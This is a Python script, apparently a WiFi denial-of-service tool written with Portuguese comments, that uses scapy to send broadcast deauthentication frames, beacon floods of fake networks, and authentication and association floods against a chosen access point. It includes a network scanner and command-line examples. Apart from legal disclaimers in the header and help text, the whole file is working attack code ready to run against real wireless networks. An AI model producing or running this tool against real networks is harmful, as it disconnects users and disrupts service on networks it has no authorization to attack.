#!/usr/bin/env python3
"""
Script de Teste de Segurança WiFi - Negação de Serviço
AVISO: Use apenas em ambientes autorizados e para fins educacionais/testes de segurança.
"""

import argparse
import sys
import time
import threading
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Deauth, Dot11Beacon, Dot11Auth, Dot11AssoReq, RadioTap
import subprocess
import os

# Suprime avisos do scapy
conf.verb = 0

class WiFiDoS:
    def __init__(self, interface=None):
        self.interface = interface
        self.running = False
        self.threads = []
        
    def get_interface(self):
        """Detecta automaticamente a interface WiFi se não fornecida"""
        if self.interface:
            return self.interface
            
        # Tenta detectar interface WiFi no Windows
        try:
            result = subprocess.run(['netsh', 'wlan', 'show', 'interfaces'], 
                                  capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if 'Name' in line and ':' in line:
                    interface = line.split(':')[1].strip()
                    if interface:
                        return interface
        except:
            pass
            
        # Fallback para interfaces comuns
        common_interfaces = ['wlan0', 'wlan1', 'Wi-Fi', 'WiFi']
        for iface in common_interfaces:
            try:
                if iface in get_if_list():
                    return iface
            except:
                continue
                
        return None
    
    def deauth_attack(self, target_bssid, client_mac='ff:ff:ff:ff:ff:ff', count=0):
        """
        Ataque de desautenticação - força desconexão de clientes
        
        Args:
            target_bssid: MAC do AP alvo
            client_mac: MAC do cliente (ff:ff:ff:ff:ff:ff para broadcast)
            count: Número de pacotes (0 = infinito)
        """
        iface = self.get_interface()
        if not iface:
            print("[!] Erro: Interface WiFi não encontrada")
            return
            
        print(f"[*] Iniciando ataque de desautenticação...")
        print(f"[*] AP Alvo: {target_bssid}")
        print(f"[*] Cliente: {client_mac}")
        print(f"[*] Interface: {iface}")
        
        # Cria pacotes de desautenticação
        # Razão 7 = Classe 3 frame received from nonassociated station
        deauth_pkt = RadioTap() / Dot11(
            type=0, subtype=12,  # Deauthentication frame
            addr1=client_mac,
            addr2=target_bssid,
            addr3=target_bssid
        ) / Dot11Deauth(reason=7)
        
        sent = 0
        while self.running:
            try:
                sendp(deauth_pkt, iface=iface, verbose=False)
                sent += 1
                if count > 0 and sent >= count:
                    break
                time.sleep(0.1)  # 10 pacotes por segundo
            except Exception as e:
                print(f"[!] Erro ao enviar pacote: {e}")
                break
                
        print(f"[*] Enviados {sent} pacotes de desautenticação")
    
    def beacon_flood(self, ssid_prefix="TEST_", count=100):
        """
        Flood de beacons - sobrecarrega a lista de redes disponíveis
        
        Args:
            ssid_prefix: Prefixo para os SSIDs falsos
            count: Número de SSIDs diferentes a criar
        """
        iface = self.get_interface()
        if not iface:
            print("[!] Erro: Interface WiFi não encontrada")
            return
            
        print(f"[*] Iniciando flood de beacons...")
        print(f"[*] Criando {count} redes falsas")
        
        ssids = [f"{ssid_prefix}{i:04d}" for i in range(count)]
        
        while self.running:
            for ssid in ssids:
                if not self.running:
                    break
                    
                # Gera MAC aleatório para cada SSID
                bssid = RandMAC()
                
                beacon = RadioTap() / Dot11(
                    type=0, subtype=8,  # Beacon frame
                    addr1='ff:ff:ff:ff:ff:ff',
                    addr2=bssid,
                    addr3=bssid
                ) / Dot11Beacon(cap=0x1104) / Dot11Elt(ID='SSID', info=ssid)
                
                try:
                    sendp(beacon, iface=iface, verbose=False)
                except Exception as e:
                    print(f"[!] Erro: {e}")
                    return
                    
            time.sleep(0.1)
    
    def auth_flood(self, target_bssid, count=0):
        """
        Flood de autenticação - sobrecarrega o AP com requisições
        
        Args:
            target_bssid: MAC do AP alvo
            count: Número de pacotes (0 = infinito)
        """
        iface = self.get_interface()
        if not iface:
            print("[!] Erro: Interface WiFi não encontrada")
            return
            
        print(f"[*] Iniciando flood de autenticação...")
        print(f"[*] AP Alvo: {target_bssid}")
        
        sent = 0
        while self.running:
            # Gera MAC aleatório para cada requisição
            fake_mac = RandMAC()
            
            auth_pkt = RadioTap() / Dot11(
                type=0, subtype=11,  # Authentication frame
                addr1=target_bssid,
                addr2=fake_mac,
                addr3=target_bssid
            ) / Dot11Auth(algo=0, seqnum=1, status=0)
            
            try:
                sendp(auth_pkt, iface=iface, verbose=False)
                sent += 1
                if count > 0 and sent >= count:
                    break
                time.sleep(0.01)  # 100 pacotes por segundo
            except Exception as e:
                print(f"[!] Erro: {e}")
                break
                
        print(f"[*] Enviados {sent} pacotes de autenticação")
    
    def assoc_flood(self, target_bssid, count=0):
        """
        Flood de associação - sobrecarrega o AP com requisições de associação
        
        Args:
            target_bssid: MAC do AP alvo
            count: Número de pacotes (0 = infinito)
        """
        iface = self.get_interface()
        if not iface:
            print("[!] Erro: Interface WiFi não encontrada")
            return
            
        print(f"[*] Iniciando flood de associação...")
        print(f"[*] AP Alvo: {target_bssid}")
        
        sent = 0
        while self.running:
            fake_mac = RandMAC()
            
            assoc_pkt = RadioTap() / Dot11(
                type=0, subtype=0,  # Association Request
                addr1=target_bssid,
                addr2=fake_mac,
                addr3=target_bssid
            ) / Dot11AssoReq(cap=0x1104, listen_interval=0x00a)
            
            try:
                sendp(assoc_pkt, iface=iface, verbose=False)
                sent += 1
                if count > 0 and sent >= count:
                    break
                time.sleep(0.01)
            except Exception as e:
                print(f"[!] Erro: {e}")
                break
                
        print(f"[*] Enviados {sent} pacotes de associação")
    
    def start_attack(self, attack_type, **kwargs):
        """Inicia um ataque em thread separada"""
        self.running = True
        
        if attack_type == 'deauth':
            thread = threading.Thread(
                target=self.deauth_attack,
                args=(kwargs.get('bssid'), kwargs.get('client', 'ff:ff:ff:ff:ff:ff')),
                kwargs={'count': kwargs.get('count', 0)}
            )
        elif attack_type == 'beacon':
            thread = threading.Thread(
                target=self.beacon_flood,
                kwargs={'ssid_prefix': kwargs.get('ssid_prefix', 'TEST_'), 
                       'count': kwargs.get('count', 100)}
            )
        elif attack_type == 'auth':
            thread = threading.Thread(
                target=self.auth_flood,
                args=(kwargs.get('bssid'),),
                kwargs={'count': kwargs.get('count', 0)}
            )
        elif attack_type == 'assoc':
            thread = threading.Thread(
                target=self.assoc_flood,
                args=(kwargs.get('bssid'),),
                kwargs={'count': kwargs.get('count', 0)}
            )
        else:
            print(f"[!] Tipo de ataque desconhecido: {attack_type}")
            return
            
        thread.daemon = True
        thread.start()
        self.threads.append(thread)
        return thread
    
    def stop(self):
        """Para todos os ataques"""
        print("\n[*] Parando ataques...")
        self.running = False
        for thread in self.threads:
            thread.join(timeout=2)
        print("[*] Ataques parados")


def scan_networks(interface=None):
    """Escaneia redes WiFi disponíveis"""
    iface = interface
    if not iface:
        # Tenta detectar interface
        try:
            result = subprocess.run(['netsh', 'wlan', 'show', 'interfaces'], 
                                  capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if 'Name' in line and ':' in line:
                    iface = line.split(':')[1].strip()
                    break
        except:
            pass
    
    print(f"[*] Escaneando redes WiFi na interface {iface}...")
    print("[*] Pressione Ctrl+C para parar\n")
    
    networks = {}
    
    def packet_handler(pkt):
        if pkt.haslayer(Dot11Beacon):
            ssid = pkt[Dot11Elt].info.decode('utf-8', errors='ignore')
            bssid = pkt[Dot11].addr2
            if ssid and bssid not in networks:
                networks[bssid] = ssid
                print(f"[+] SSID: {ssid:30s} | BSSID: {bssid}")
    
    try:
        sniff(iface=iface, prn=packet_handler, timeout=10)
    except KeyboardInterrupt:
        pass
    except Exception as e:
        print(f"[!] Erro ao escanear: {e}")
        print("[!] Tente especificar a interface manualmente com -i")
    
    return networks


def main():
    parser = argparse.ArgumentParser(
        description='Ferramenta de Teste de Segurança WiFi - DoS',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
AVISOS LEGAIS:
- Use APENAS em ambientes autorizados
- Use APENAS para testes de segurança legítimos
- O uso não autorizado é ILEGAL e pode resultar em penalidades criminais
- O autor não se responsabiliza pelo uso indevido desta ferramenta

Exemplos de uso:
  # Escanear redes disponíveis
  python wifi_dos.py --scan
  
  # Ataque de desautenticação (derruba clientes)
  python wifi_dos.py --deauth -b AA:BB:CC:DD:EE:FF
  
  # Flood de beacons (sobrecarrega lista de redes)
  python wifi_dos.py --beacon --count 500
  
  # Flood de autenticação
  python wifi_dos.py --auth -b AA:BB:CC:DD:EE:FF
  
  # Múltiplos ataques simultâneos
  python wifi_dos.py --deauth -b AA:BB:CC:DD:EE:FF --beacon
        """
    )
    
    parser.add_argument('-i', '--interface', help='Interface WiFi (ex: wlan0, Wi-Fi)')
    parser.add_argument('-b', '--bssid', help='MAC address do AP alvo (BSSID)')
    parser.add_argument('-c', '--client', default='ff:ff:ff:ff:ff:ff', 
                       help='MAC do cliente (padrão: broadcast)')
    parser.add_argument('--count', type=int, default=0,
                       help='Número de pacotes (0 = infinito)')
    parser.add_argument('--ssid-prefix', default='TEST_',
                       help='Prefixo para SSIDs falsos no beacon flood')
    
    # Tipos de ataque
    parser.add_argument('--scan', action='store_true',
                       help='Escaneia redes WiFi disponíveis')
    parser.add_argument('--deauth', action='store_true',
                       help='Ataque de desautenticação')
    parser.add_argument('--beacon', action='store_true',
                       help='Flood de beacons')
    parser.add_argument('--auth', action='store_true',
                       help='Flood de autenticação')
    parser.add_argument('--assoc', action='store_true',
                       help='Flood de associação')
    
    args = parser.parse_args()
    
    # Verifica se está rodando como root/admin (necessário para enviar pacotes raw)
    if os.name != 'nt':  # Linux/Mac
        if os.geteuid() != 0:
            print("[!] AVISO: Este script precisa ser executado como root (sudo)")
            print("[!] Tentando continuar mesmo assim...\n")
    else:  # Windows
        try:
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin()
            if not is_admin:
                print("[!] AVISO: Execute como Administrador para melhor resultado\n")
        except:
            pass
    
    # Modo scan
    if args.scan:
        scan_networks(args.interface)
        return
    
    # Verifica se pelo menos um ataque foi especificado
    if not any([args.deauth, args.beacon, args.auth, args.assoc]):
        parser.print_help()
        print("\n[!] Erro: Especifique pelo menos um tipo de ataque")
        return
    
    # Verifica BSSID para ataques que precisam
    if any([args.deauth, args.auth, args.assoc]) and not args.bssid:
        print("[!] Erro: --bssid é obrigatório para deauth, auth e assoc")
        print("[!] Use --scan para encontrar o BSSID da rede alvo")
        return
    
    # Cria instância do atacador
    attacker = WiFiDoS(interface=args.interface)
    
    # Inicia ataques
    try:
        if args.deauth:
            attacker.start_attack('deauth', 
                                bssid=args.bssid, 
                                client=args.client,
                                count=args.count)
        
        if args.beacon:
            attacker.start_attack('beacon',
                                ssid_prefix=args.ssid_prefix,
                                count=args.count if args.count > 0 else 100)
        
        if args.auth:
            attacker.start_attack('auth',
                                bssid=args.bssid,
                                count=args.count)
        
        if args.assoc:
            attacker.start_attack('assoc',
                                bssid=args.bssid,
                                count=args.count)
        
        print("\n[*] Ataques em execução... Pressione Ctrl+C para parar\n")
        
        # Mantém o script rodando
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        attacker.stop()
        print("\n[*] Script finalizado")
    except Exception as e:
        attacker.stop()
        print(f"\n[!] Erro: {e}")
        sys.exit(1)


if __name__ == '__main__':
    main()

